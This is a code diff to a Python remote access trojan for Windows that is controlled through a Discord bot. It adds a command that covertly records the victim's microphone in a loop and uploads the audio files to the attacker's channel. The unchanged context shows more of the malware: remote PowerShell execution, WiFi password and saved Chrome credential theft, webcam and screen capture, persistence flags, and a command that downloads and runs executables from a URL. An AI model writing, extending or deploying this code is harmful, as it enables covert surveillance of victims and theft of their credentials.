@@ -3,6 +3,7 @@ import cv2
 import sys
 import uuid
 import json
+import wave
 import shutil
 import psutil
 import socket
@@ -18,8 +19,10 @@ import subprocess
 import numpy as np
 import winreg as reg
 import urllib.request
+import sounddevice as sd
 from datetime import datetime
 from Crypto.Cipher import AES
+from pydub import AudioSegment
 from discord.ext import commands
 from win32crypt import CryptUnprotectData
 
@@ -35,14 +38,17 @@ intents.guilds = True # Enables interaction with discord server
 intents.message_content = True # Allow bot to read messages from discord channel
 bot = commands.Bot(command_prefix='!', intents=intents) # Bot prefix
 
-#start check vars
+# Start check vars
 startup_folder_flag_C = False
 startup_folder_flag_A = False
 register_flag_C = False
 register_flag_A = False
 
-#screen recording vars
+# Screen recording vars
 recording_task = None
+
+# Audio recording vars
+is_audiorecording = False
 
 # Functions
 def get_ip_address():
@@ -121,6 +127,41 @@ async def main_loop():
         print("loop")
         await asyncio.sleep(5)
 
+async def record_audio(duration: int):
+    global is_audiorecording
+    fs = 44100  # Sample rate
+    channels = 2  # Stereo audio
+    audio_data = None
+
+    is_audiorecording = True
+    print(f"Recording started for {duration} seconds...")
+
+    # Record the audio in chunks and accumulate them
+    chunk_duration = 1  # seconds per chunk
+    num_chunks = duration // chunk_duration
+
+    for _ in range(num_chunks):
+        if not is_audiorecording:
+            break  # Stop if recording is disabled
+        chunk = sd.rec(int(chunk_duration * fs), samplerate=fs, channels=channels, dtype='int16')
+        sd.wait()
+        audio_data = chunk if audio_data is None else np.concatenate((audio_data, chunk), axis=0)
+
+    print("Recording finished.")
+    return audio_data
+
+# Function to save audio data as a WAV file
+async def save_audio_as_wav(audio_data, filename):
+    fs = 44100  # Sample rate
+    channels = 2  # Stereo audio
+    with wave.open(filename, 'wb') as wf:
+        wf.setnchannels(channels)
+        wf.setsampwidth(2)  # 16-bit audio
+        wf.setframerate(fs)
+        wf.writeframes(audio_data.tobytes())
+    return filename
+
+
 async def record_screen(ctx, rec: bool):
     try:
         # Define output name by timestamp
@@ -161,7 +202,7 @@ async def record_screen(ctx, rec: bool):
 
 @bot.command()
 async def what(ctx):
-    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**cam**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**echo**-(make the bot echo you)\n**lauch**-(launch programs like this launch https://website_url.com/update.exe customApplicationName.exe)\n**restart**-(restart bot)\n**stopbot**-(You know what this does)"
+    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**cam**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**audio**-(make audio recodings with 10 seconds interfall: !audio start 10 | stop the recording: !audio stop\n**echo**-(make the bot echo you)\n**lauch**-(launch programs like this launch https://website_url.com/update.exe customApplicationName.exe)\n**restart**-(restart bot)\n**stopbot**-(You know what this does)"
     await ctx.send(commands)
 
 @bot.command()
@@ -354,6 +395,44 @@ async def getsysinfo(ctx):
     except Exception as e:
         return {"Error": f"Error getting system info: {e}"}
     
+@bot.command()
+async def audio(ctx, action: str, duration: str = None):
+    global is_audiorecording
+
+    try:
+        if action.lower() == "start":
+            if is_audiorecording:
+                await ctx.send("❌ A recording is already in progress!")
+                return
+            if not duration or not duration.isdigit():
+                await ctx.send("❌ Please provide a valid duration in seconds!")
+                return
+
+            duration = int(duration)
+            is_audiorecording = True
+            await ctx.send("✅ Starting audio recording loop")
+
+            # Loop until stop is called
+            while is_audiorecording:
+                # Start audio recording
+                audio_data = await record_audio(duration)
+                wav_file = await save_audio_as_wav(audio_data, "msg.wav")
+                await ctx.channel.send(file=discord.File(wav_file, 'msg.wav'))
+                await asyncio.sleep(1)
+
+        elif action.lower() == "stop":
+            if not is_audiorecording:
+                await ctx.send("❌ No recording is currently in progress!")
+                return
+            is_audiorecording = False
+            await ctx.send("✅ Stopping the audio recording loop")
+
+        else:
+            await ctx.send("❌ Use 'start' or 'stop'!")
+            
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
 @bot.command()
 async def screen(ctx, action: str):
     global recording_task  # To access the global task variable
